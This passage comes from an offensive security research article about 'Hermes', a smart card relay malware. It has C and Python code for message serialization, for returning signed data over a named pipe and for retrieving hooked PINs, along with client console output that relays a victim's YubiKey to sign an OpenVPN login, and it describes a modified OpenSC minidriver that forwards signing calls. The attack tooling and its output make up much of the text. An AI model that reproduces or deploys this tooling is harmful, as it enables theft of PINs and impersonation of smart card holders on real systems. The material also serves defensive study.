+  reader index
+
+- pincache [get|delete]
+  + retrieves/deletes the PIN log file from the "hook" module
+
+The "target" command starts the "Hermes Relay server". This will start a TCP
+server on localhost and wait for any signing operations on the attacker's
+machine.
+
+PS > python .\hermes_gate.py devlan/marc:Passw0rd!@192.168.44.162
+Hermes Gate client
+Connected to: 192.168.44.162
+$ readers
+Total of 1 reader
+[0] Alcorlink USB Smart Card Reader 0
+        Reader vendor: Alcorlink
+        Reader model : USB Smart Card Reader
+        Card model   : TC_FNMT_CM
+        Minidriver   : TC_FNMT_CMx64.dll
+        ATR          : 3b7f960000006a464e4d54000200b80566039000
+$ target 0 0 J3DHn52bmTAf
+[i] Selected reader "Alcorlink USB Smart Card Reader 0" with card TC_FNMT_CM
+[+] Hermes relay server listening on 127.0.0.1:12345
+[i] Waiting for connections...
+----[ 4.6.3 - Smart card emulator
+
+By obtaining the public certificate from the smart card, we can use
+PIVert[11] to trick the attacker's Windows system into thinking we have a
+smart card with the real private key that corresponds to that certificate
+(while only having the public certificate).
+
+PIVert uses the BixVReader virtual smart card driver to attach an emulated
+smart card with the certificate. This will allow the attacker's Windows
+system to initiate a card signing operation when using an application that
+requires the certificate. BixVReader's job is to simply hold the
+certificate. It doesn't process any data to be signed.
+
+----[ 4.6.4 - Modified OpenSC minidriver
+
+OpenSC[12] is an open-source project that contains libraries and tools to
+interact with smart cards, with a corresponding Windows minidriver.
+
+I modified the CardSignData() function from the minidriver to instead
+connect to the Hermes relay server (listening on the attacker's machine) and
+send all the arguments in a serialized format via TCP.
+
+The modified OpenSC minidriver is installed on the attacker's machine.
+Whenever the attacker uses an application that tries to sign data with the
+certificate from the smart card emulator, the minidriver will intercept the
+signing operation and send it to Hermes instead.
+
+This delegates the signing operation to the real smart card. We send the
+data to be signed to the Hermes agent along with the PIN, which will ask the
+smart card to sign the data on our behalf.
+
+Once the data is signed, it is returned to the modified OpenSC minidriver
+via the Hermes relay server. Thus, the CardSignData() call on the attacker's
+machine returns the signed data from the victim, to the service we're
+authenticating on (e.g., a VPN server), effectively "proxying" the smart
+card.
+
+----[ 4.6.5 - Message serialization
+
+The implementation of serialization/deserialization of messages, is inspired
+from the Havoc Framework[13], with some minor changes.
+
+There is a "parser" (deserialize) and a "package" (serialize). The parser
+has the following functions:
+
+- ParserNew
+- ParserGetByte
+- ParserGetBool
+- ParserGetInt16
+- ParserGetInt32
+- ParserGetInt64
+- ParserGetBytes
+- ParserGetString
+- ParserGetWString
+- ParserDestroy
+
+As an example, here is code parsing the "HOOK_DATA" parameters from the
+"hook" command:
+
+ParserNew( &Parser, buffer, size );
+
+// skip HERMES magic header
+Parser.Buffer += 7;
+Parser.Length -= 7;
+
+ParserGetInt32( &Parser ); // ignore cmd_id
+hookData.enableHook = ParserGetBool( &Parser );
+hookData.readerName = ParserGetWString( &Parser, NULL );
+hookData.miniDriver = ParserGetWString( &Parser, NULL );
+hookData.cardName   = ParserGetWString( &Parser, NULL );
+hookData.dwVersion  = ParserGetInt32( &Parser );
+hookData.cbATR      = ParserGetInt32( &Parser );
+hookData.pbATR      = ParserGetBytes( &Parser, &hookData.cbATR );
+
+int ret = hookPIN( &hookData );
+
+The message structure is identified by the cmd_id, which is always the first
+32-bit int in the data.
+
+The "package" (serialize) helpers are the same, except serialize existing
+data to send over the network.
+
+- PackageNew
+- PackageWrite
+- PackageAddByte
+- PackageAddBool
+- PackageAddInt32
+- PackageAddInt64
+- PackageAddBytes
+- PackageAddString
+- PackageAddWString
+- PackageDestroy
+
+Here is an example of returning signed data from CardSignData() by packaging
+the data and sending it back over the named pipe's `hPipe` global handle:
+
+DWORD signRet = cardData.pfnCardSignData( pCardData, &signInfo );
+
+if ( signRet != SCARD_S_SUCCESS ) {
+    PACKAGE Package = { 0 };
+    PackageNew( &Package );
+    PackageAddByte( &Package, ERROR_CARDSIGNDATA );
+    PackageAddInt32( &Package, signRet );
+
+    DWORD dwBytesWritten = 0;
+    WriteFile( hPipe,
+               &Package.Length,
+               sizeof( int ),
+               &dwBytesWritten,
+               NULL );
+    WriteFile( hPipe,
+               Package.Buffer,
+               Package.Length,
+               &dwBytesWritten,
+               NULL );
+    PackageDestroy( &Package );
+    SCardDisconnect( hCard, SCARD_LEAVE_CARD );
+
+    return;
+}
+
+PACKAGE Package = { 0 };
+PackageNew( &Package );
+
+PackageAddByte( &Package, (BYTE)0 ); // 0, indicating success
+PackageAddInt32( &Package, 0 );      // 0, no error code
+
+if ( signInfo.pbSignedData ) {
+    PackageAddBytes( &Package,
+                     signInfo.pbSignedData,
+                     signInfo.cbSignedData );
+} else {
+    BYTE signedDataErr = 0;
+    PackageAddBytes( &Package, &signedDataErr, 1 );
+}
+
+DWORD dwBytesWritten = 0;
+WriteFile( hPipe, &Package.Length, sizeof( int ), &dwBytesWritten, NULL );
+WriteFile( hPipe, Package.Buffer, Package.Length, &dwBytesWritten, NULL );
+PackageDestroy( &Package );
+SCardDisconnect( hCard, SCARD_LEAVE_CARD );
+
+return;
+From Python, we have equivalent functions that follow the same format as the
+C helpers from Havoc:
+
+- get_byte
+- get_bool
+- get_int32
+- get_int64
+- get_bytes
+- get_string
+- get_wstring
+
+- add_byte
+- add_bool
+- add_int32
+- add_int64
+- add_bytes
+- add_string
+- add_wstring
+
+This is an example of sending and reading the PIN hooking's log file to
+retrieve the intercepted PINs by the malware:
+
+pkg = package.Package()
+
+pkg.add_int32(pin_cache_CMD_ID)
+pkg.add_bool(True)
+agent.writepipe(bytes(pkg.buffer))
+
+output = parser.PackageParser(agent.readpipe())
+error  = output.get_int32()
+
+if error:
+    print(f"[-] Error getting the PIN cache log file: {error}.")
+    return
+log_output = output.get_string(encoding="ansi")
+print(log_output)
+----[ 4.6.6 - Overview
+
+The following diagram illustrates how the whole architecture of the malware
+works when trying to authenticate to a server that requires smart card
+authentication:
+
+   Smart Card Auth                                                          
+       Server                                                               
+    +----------+                                                            
+    |  ------  |                                                            
+    |  ------  |                                                            
+    |  ------  |                                                            
+    |          |                                                            
+    |          |<-----------+                                               
+    |          |            |                                               
+    |          |            |                                               
+    +----------+    1. Send public cert*                                    
+       |   ^                |                                               
+       |   | Attacker Host  |                         Target host           
+ +-----+---+----------------+-------+       +------------------------------+
+ |     | 5. Authenticate            |       |               +----------+   |
+ |     |   |          +----------+  |       |               |Smart Card|   |
+ | CardSignData()     |Smart Card|  |       |               +----------+   |
+ |     |   |          | Emulator |  |       |                  |    ^      |
+ |     v   |          +----------+  |       |                  |    |      |
+ |   +--------+  4. Return signed data      |            3. CardSignData() |
+ |   |Modified|<---+                |       |                  |    |      |
+ |   | OpenSC |    |   +--------+   |       |  +--------+      v    |      |
+ |   +--------+    +---| Hermes |<--+-------+--| Hermes |   +----------+   |
+ |     |               | Relay  |   |       |  | Agent  |===|Minidriver|   |
+ |     +-------------->| Server |---+-------+->| DLL    |   +----------+   |
+ |    2. Send data     +--------+   | Named |  +--------+                  |
+ |       to sign                    | Pipe  |                              |
+ +----------------------------------+       +------------------------------+
+
+*) The smart card emulator doesn't send the cert itself. It's just a way to
+illustrate that Windows will send the public certificate we loaded in the
+virtual smart card.
+
+This is a demonstration of the Hermes Gate client from the attacker host 
+when trying to log into a VPN that requires a certificate from the remote 
+smart card.
+
+PS > python .\hermes_gate.py DEVLAN/marc:Passw0rd!@192.168.44.162
+Hermes Gate client
+Connected to: 192.168.44.162
+$ target 0 0 123456
+[i] Selected reader "VMware Virtual USB CCID 0" with card YubiKey Smart Card
+[+] Hermes relay server listening on 127.0.0.1:12345
+[i] Waiting for connections...
+Connection from: ('127.0.0.1', 54738)
+
+[i] Signing operation requested from openvpn.exe
+sending data: e53ce5a72638e71bd0c1c3e17b9cdb03635b18af3bb7d69a319df19074e68e
+7fac89f2c902a445c09f1c03a160265b09
+Signed data : 153a43e4b5df8da87e453bbd3db4c6cf8872e23b018a46a0e20e9d59404af0
+abdc55205f94312ad3cf3aa0f5a9feddafbd08caef771262d4ed947c9e0c29b82994bf2e1e32
+f4e22f053c76a365bc5553d8fdf230f2ece8fe5152adac1eb9d10f
+
+--[ 5 - Closing thoughts
+
+This research took multiple months to do. Getting the right malware
+architecture was also tricky and required multiple iterations to get to 
+this point.
+
+Very little AI was used in this whole process, only some helpers and the
+serialization/deserialization functions were written by an LLM. I want to
+recommend everyone who is reading this to keep doing research by using your
+brain.
+
+There is nothing more satisfying than spending months looking into something
+with very little public offensive research, getting your hands dirty, and
+writing some really cool malware.
+
+Obviously nothing about this is a vulnerability, we're simply abusing how
+the Windows smart card minidriver architecture works.
+
+I hope you've enjoyed this read and learnt something along the way.
+
+--[ 6 - References
+
+[0] SANS' malware analysis into Sykipot
+    https://www.sans.org/white-papers/33919
+
+[1] Relaying Yubikeys
+    https://web.archive.org/web/20221007052117/https://cube0x0.github.io/
+    Relaying-YubiKeys/
+
+[2] PIVert-Relay
+    https://github.com/cube0x0/PIVert-Relay
+
+[3] windows smart card minidriver specification
+    https://download.microsoft.com/download/3/3/2/
+    332fd70b-f04d-470a-a135-040350b9563f/sc-minidriver_specs_v7.07.docx
+
+[4] cardmod.h header file
+    https://github.com/microsoft/win32metadata/blob/main/generation/WinSDK/
+    AdditionalHeaders/cpdk/cardmod.h#L1709
+
+[5] ida-sigmaker plugin
+    https://github.com/mahmoudimus/ida-sigmaker
+
+[6] SignatureScanner
+    https://github.com/Zer0Mem0ry/SignatureScanner/
+
+[7] Winbindex
+    https://winbindex.m417z.com/
+
+[8] Certutil.exe's -scinfo code from windows XP
+    https://github.com/tongzx/nt5src/blob/master/Source/XPSP1/NT/ds/
+    security/services/ca/tools/certut/scinfo.cpp
+
+[9] Mimikatz's code for enumerating smart cards and readers
+    https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/
+    crypto/kuhl_m_crypto_sc.c#L124
+
+[10] MinHook windows C hooking library
+     https://github.com/tsudakageyu/minhook
+
+[11] PIVert
+     https://github.com/cube0x0/PIVert-Relay/tree/master/PIVert
+
+[12] OpenSC windows smart card minidriver
+     https://github.com/OpenSC/OpenSC/blob/master/src/minidriver/
+     minidriver.c
+
+[13] Havoc Framework's parser
+     https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/
+     core/Parser.c
+
+--[ EOF
